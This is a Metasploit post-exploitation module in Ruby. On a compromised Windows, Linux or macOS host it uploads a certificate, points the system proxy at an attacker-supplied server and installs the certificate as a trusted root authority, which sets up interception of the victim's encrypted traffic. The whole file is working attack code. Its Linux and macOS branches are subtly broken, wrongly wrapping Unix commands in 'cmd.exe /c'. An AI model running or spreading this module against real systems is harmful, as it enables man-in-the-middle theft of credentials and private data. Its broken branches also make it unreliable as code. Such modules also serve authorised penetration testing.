##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File

  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Upload and Inject CA',
      'Description'   => %q{ Upload file and inject Certificate Authority },
      'License'       => MSF_LICENSE,
      'Author'        => [ 'Ryuk'],
      'Platform'      => [ 'win','linux','osx' ],
      'SessionTypes'  => [ 'meterpreter','shell' ]
    ))

    register_options(
      [
        OptPath.new('LFILE', [true,'Local file to upload']),
        OptString.new('RFILE', [false,'Name of file on target (default is basename of LFILE)']),
        OptAddress.new('ProxyServer', [true,'The proxy server address']),
        OptPort.new('ProxyPort', [true,'The proxy server port']),
      ])
  end

  def rfile
    if datastore['RFILE'].blank?
      remote_name = File.basename(datastore['LFILE'])
    else
      remote_name = datastore['RFILE']
    end

    remote_name
  end

  def lfile
    datastore['LFILE']
  end

def run
	upload_file(rfile, lfile)
       print_status("Upload file on Remote machine ...")
    if session.platform.include?("windows")
       cmd_exec("cmd.exe /c reg add \"HKCU\\software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" ^ /v ProxyEnable /t REG_DWORD /d 1 /f")
       cmd_exec("cmd.exe /c reg add \"HKCU\\software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" ^ /v ProxyServer /t REG_SZ /d #{datastore['ProxyServer']}:#{datastore['ProxyPort']} /f")
       print_status("Change proxy service ...")
       cmd_exec("certutil -addstore root #{rfile}")
       print_status("Inject Certificate Authority file ...")
       print_good("Finish the module ...")
     end
     if session.platform.include?("linux")
       cmd_exec("cmd.exe /c export https_proxy=\"https://#{datastore['ProxyServer']}:#{datastore['ProxyPort']}\"")
       print_status("Change proxy service ...")
       cmd_exec("cmd.exe /c sudo cp #{rfile} /usr/local/share/ca-certificates/#{rfile} && sudo update-ca-certificates")
       print_status("Inject Certificate Authority file ...")
       print_good("Finish the module ...")
     end
     if session.platform.include?("osx")
       cmd_exec("cmd.exe /c export https_proxy=\"https://#{datastore['ProxyServer']}:#{datastore['ProxyPort']}\"")
       print_status("Change proxy service ...")
       cmd_exec("cmd.exe /c sudo security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain #{rfile}")
       print_status("Inject Certificate Authority file ...")
       print_good("Finish the module ...")
    end
    rm_f(rfile)
  end
end

